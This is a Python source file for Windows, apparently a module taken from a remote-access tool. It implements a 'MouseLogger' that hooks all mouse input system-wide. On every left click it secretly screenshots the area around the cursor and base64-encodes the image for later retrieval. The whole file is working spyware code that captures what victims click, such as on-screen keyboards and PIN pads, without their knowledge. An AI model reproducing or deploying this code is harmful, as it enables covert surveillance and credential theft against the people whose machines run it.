# Mostly stolen form Nicolas VERDIER (contact@n1nj4.eu)
# Mostly stolen by golind
import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
import threading
import time
import base64
import win32gui, win32ui, win32con, win32api

# http://nullege.com/codes/show/src@m@o@mozharness-HEAD@external_tools@mouse_and_screen_resolution.py/114/ctypes.windll.user32.GetCursorPos
from ctypes import windll, Structure, c_ulong, byref

class POINT(Structure):
	_fields_ = [("x", c_ulong), ("y", c_ulong)]

def queryMousePosition():
	pt = POINT()
	windll.user32.GetCursorPos(byref(pt))
	return { "x": pt.x, "y": pt.y}


user32 = windll.user32
kernel32 = windll.kernel32
WH_MOUSE_LL=14
WM_MOUSEFIRST=0x0200

keyCodes={
	0x200 : "", #"[MOUSEMOVE]", ## commented bcuz it spams the living crap out of the output.
	0x201 : "", #"[LBUTTONDOWN]",
	0x202 : "", #"[LBUTTONUP]",
	0x203 : "", #"[LBUTTONDBLCLK]",
	0x204 : "", #"[RBUTTONDOWN]",
	0x205 : "", #"[RBUTTONUP]",
	0x206 : "", #"[RBUTTONDBLCLK]",
	0x207 : "", #"[MBUTTONDOWN]",
	0x208 : "", #"[MBUTTONUP]",
	0x209 : "", #"[MBUTTONDBLCLK]",
	0x20A : "", #"[MOUSEWHEEL]",
	0x20B : "", #"[XBUTTONDOWN]",
	0x20C : "", #"[XBUTTONUP]",
	0x20D : "", #"[XBUTTONDBLCLK]",
	0x20E : "", #"[MOUSEHWHEEL]"
}

class MouseLogger(threading.Thread):
	def __init__(self, *args, **kwargs):
		threading.Thread.__init__(self, *args, **kwargs)
		self.hooked  = None
		self.daemon=True
		self.keys_buffer=""
		self.lUser32=user32
		self.pointer=None
		self.stopped=False

	def run(self):
		if self.install_hook():
			print "mouselogger installed"
		else:
			raise RuntimeError("couldn't install mouselogger")
		msg = MSG()
		user32.GetMessageA(byref(msg),0,0,0)
		while not self.stopped:
			time.sleep(.2)
		self.uninstall_hook()
			
	def stop(self):
		self.stopped=True

	def dump(self):
		res=self.keys_buffer
		self.keys_buffer=""
		return res

	def convert_key_code(self, code):
		##http://www.pinvoke.net/default.aspx/Constants.WM
		if code in keyCodes:
			if code == 0x201:
				pos = queryMousePosition()
				left = pos['x']-100
				top = pos['y']-50
				height = 100
				width = 200

				limit_width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
				limit_height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
				limit_left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
				limit_top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

				height = min(height,limit_height)
				width = min(width,limit_width)
				left = max(left,limit_left)
				top = max(top,limit_top)

				hwin = win32gui.GetDesktopWindow()
				hwindc = win32gui.GetWindowDC(hwin)
				srcdc = win32ui.CreateDCFromHandle(hwindc)
				memdc = srcdc.CreateCompatibleDC()
				bmp = win32ui.CreateBitmap()
				bmp.CreateCompatibleBitmap(srcdc, width, height)
				memdc.SelectObject(bmp)
				memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
				timestamp = int(time.time())
				bmp.SaveBitmapFile(memdc, "%d.bmp"%(timestamp))

				img = "%d.bmp"%(timestamp)
				with open(img, "rb") as imgFile:
					imgStr = base64.b64encode(imgFile.read())
				return [timestamp]+[imgStr]
			return keyCodes[code]


	def install_hook(self):
		CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
		self.pointer = CMPFUNC(self.hook_proc)
		self.hooked = self.lUser32.SetWindowsHookExA(WH_MOUSE_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
		if not self.hooked:
			return False
		return True
	
	def uninstall_hook(self):
		if self.hooked is None:
			return
		self.lUser32.UnhookWindowsHookEx(self.hooked)
		self.hooked = None

	def hook_proc(self, nCode, wParam, lParam):
		hooked_key = self.convert_key_code(wParam)
		self.keys_buffer+=str(hooked_key)
		return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)

if __name__=="__main__":
	MouseLogger = MouseLogger()
	MouseLogger.start()
	while True:
		time.sleep(5)
		print MouseLogger.dump()
